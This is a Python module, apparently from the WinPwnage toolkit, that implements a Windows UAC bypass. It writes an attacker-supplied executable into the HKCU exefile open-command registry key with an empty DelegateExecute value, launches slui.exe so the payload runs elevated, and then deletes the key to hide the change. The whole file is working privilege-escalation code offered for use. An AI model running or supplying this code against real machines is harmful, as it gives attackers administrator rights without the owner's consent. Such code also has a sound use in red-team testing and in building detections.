import os
import time
import _winreg
from winpwnage.core.prints import *
from winpwnage.core.utils import *

slui_info = {
	"Description": "Bypass UAC using slui and registry key manipulation",
	"Id": "3",
	"Type": "UAC bypass",
	"Fixed In": "99999" if not information().uac_level() == 4 else "0",
	"Works From": "9600",
	"Admin": False,
	"Function Name": "slui",
	"Function Payload": True,
}


def slui(payload):
	if payloads().exe(payload):
		try:
			key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, os.path.join("Software\\Classes\\exefile\\shell\\open\\command"))
			_winreg.SetValueEx(key, None, 0, _winreg.REG_SZ, os.path.join(payload))
			_winreg.SetValueEx(key, "DelegateExecute", 0, _winreg.REG_SZ, None)
			_winreg.CloseKey(key)
		except Exception as error:
			print_error("Unable to create registry keys, exception was raised: {}".format(error))
			return False
		else:
			print_success("Successfully created Default key containing payload ({})".format(os.path.join(payload)))
			print_success("Successfully created DelegateExecute key")

		time.sleep(5)

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			if process().runas(os.path.join("slui.exe")):
				print_success("Successfully elevated process ({})".format(os.path.join(payload)))
			else:
				print_error("Unable to elevate process ({})".format(os.path.join(payload)))

		time.sleep(5)

		try:
			_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\\Classes\\exefile\\shell\\open\\command"))
		except Exception as error:
			print_error("Unable to cleanup")
			return False
		else:
			print_success("Successfully cleaned up, enjoy!")
	else:
		print_error("Cannot proceed, invalid payload")
		return False
